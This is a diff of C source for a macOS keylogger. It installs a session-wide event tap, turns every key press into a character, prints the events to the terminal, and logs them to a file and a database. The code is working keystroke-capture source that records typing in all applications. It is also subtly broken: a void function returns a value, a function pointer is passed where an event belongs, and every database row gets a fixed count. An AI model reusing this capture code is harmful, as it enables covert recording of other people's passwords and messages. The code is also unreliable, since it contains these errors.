@@ -1,22 +1,12 @@
 #pragma once
+#include "submodules/meson_deps/submodules/generic-print/print.h"
+#include <signal.h>
+#include <stdlib.h>
 /**********************************/
 #define WRITE_LOG_FILE          true
 #define DELETE_DATABASE_FILE    false
 /**********************************/
 #include "keylogger.h"
-#include <assert.h>
-#include <Carbon/Carbon.h>
-#include <fnmatch.h>
-#include <libproc.h>
-#include <mach/mach_time.h>
-#include <stdbool.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/proc_info.h>
-#include <sys/sysctl.h>
-#include <sys/time.h>
-#include <sys/types.h>
-#include <unistd.h>
 /**********************************/
 CFArrayRef windowList;
 volatile unsigned int windows_qty = 0;
@@ -27,6 +17,47 @@ volatile unsigned long
   mouse_events_qty = 0,
   kb_events_qty    = 0
 ;
+
+
+keylogger_stats_t *kl;
+bool              was_icanon = false;
+bool              exited     = false;
+
+
+void __at_exit(void){
+  if (exited) {
+    return(0);
+  }
+  exited = true;
+  bool ic = seticanon(was_icanon, true);
+  fprintf(stdout, "%s", AC_SHOW_CURSOR);
+  if (false) {
+    fprintf(stdout, "%s", AC_RESTORE_PALETTE);
+  }
+  if (false) {
+    fprintf(stdout, "%s", AC_ALT_SCREEN_OFF);
+  }
+  exit(0);
+}
+
+#define INIT_KEYLOGGER_STATS()    { do {                                                      \
+                                      if (false) fprintf(stdout, "%s", AC_SAVE_PALETTE);      \
+                                      if (false) fprintf(stdout, "%s", AC_ALT_SCREEN_ON);     \
+                                      bool ic = seticanon(false, false);                      \
+                                      if (ic == true)                                         \
+                                      was_icanon = true;                                      \
+                                      fprintf(stdout, "%s", AC_HIDE_CURSOR);                  \
+                                      kl                 = malloc(sizeof(keylogger_stats_t)); \
+                                      kl->times          = malloc(sizeof(times_t));           \
+                                      kl->qty            = malloc(sizeof(since_t));           \
+                                      kl->since          = malloc(sizeof(since_t));           \
+                                      kl->since->any     = 0;                                 \
+                                      kl->times->started = timestamp();                       \
+                                      kl->times->ts      = kl->times->started;                \
+                                      kl->times->last    = 0;                                 \
+                                      kl->qty->any       = 0;                                 \
+                                    } while (0); }
+
 CGPoint     mouse_location;
 /**********************************/
 CGEventMask mouse_and_kb_events = (
@@ -56,46 +87,55 @@ void append_keystroke_log(const char *ckc){
 
 
 /**********************************/
-void tap_events(){
+static int tap_events(){
   CFRunLoopRun();
+  return(0);
 }
 
 
-void setup_event_tap(){
+static int setup_event_tap(){
   CFMachPortRef event_tap = CGEventTapCreate(
     kCGSessionEventTap, kCGHeadInsertEventTap, 0, mouse_and_kb_events, event_handler, NULL
     );
 
   if (!event_tap) {
     fprintf(stderr, "ERROR: Unable to create keyboard event tap.\n");
-    exit(1);
+    return(1);
   }
 
   CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);
 
   CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
   CGEventTapEnable(event_tap, true);
+  return(0);
 }
 
 
 /**********************************/
-void init(){
-  started        = timestamp();
+int init(){
+  signal(SIGINT, __at_exit);
+  signal(SIGTERM, __at_exit);
+  signal(SIGQUIT, __at_exit);
+  atexit(__at_exit);
+  INIT_KEYLOGGER_STATS();
+  started = timestamp();
+  assert(keylogger_init_db() == 0);
   mouse_location = CGEventGetLocation(event_handler);
+  return(0);
 }
+
+
 /**********************************/
 
 
 CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-  unsigned long
-    ts = timestamp();
+  kl->times->ts = timestamp();
+  kl->qty->any++;
   bool
-    key_up = (type == kCGEventKeyUp), key_down = (type == kCGEventKeyDown)
+       key_up = (type == kCGEventKeyUp), key_down = (type == kCGEventKeyDown)
   ;
-  char
-  *action = "";
+  char *action = "";
 
-  events_qty++;
   if (key_up) {
     action = "UP";
   }else if (key_down) {
@@ -103,23 +143,29 @@ CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
   }else{
     action = "UNKNOWN";
   }
-  if (last_ts < 1) {
-    last_ts = ts;
-  }
-
 
   CGKeyCode  keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+  const char *ckc    = convertKeyCode(keyCode);
+  kl->since->any = (kl->qty->any > 0) ?  (kl->times->ts - kl->times->last) : (0);
 
-  const char *ckc = convertKeyCode(keyCode);
-
-  fprintf(stdout, "keycode:%hu\n", keyCode);
-  fprintf(stdout, "keycode:%s\n", ckc);
+  fprintf(stdout, "%s", AC_CLS);
+  PRINT("<", kl->times->ts, ">",
+        "\n\t  | keycode: ", keyCode, "| action:", action, "|", (char *)ckc,
+        "\n\t  | last:", kl->times->last,
+        "\n\t  | key up?", key_up, "since any:", kl->since->any,
+        "\n\t  | any qty:", kl->qty->any
+        );
+  kl->times->last = kl->times->ts;
+  keylogger_insert_db_row(&(logged_key_event_t){
+    .ts  = timestamp(),
+    .qty = 5,
+  });
 
   return(event);
 } /* CGEventCallback */
 
 
-const char *convertKeyCode(int keyCode) {
+static const char *convertKeyCode(int keyCode) {
   switch ((int)keyCode) {
   case 0:   return("a");
 
@@ -354,9 +400,9 @@ const char *convertKeyCode(int keyCode) {
 
 /**********************************/
 int keylogger_exec() {
-  init();
-  setup_event_tap();
-  tap_events();
+  assert(init() == 0);
+  assert(setup_event_tap() == 0);
+  assert(tap_events() == 0);
   return(0);
 }
 /**********************************/
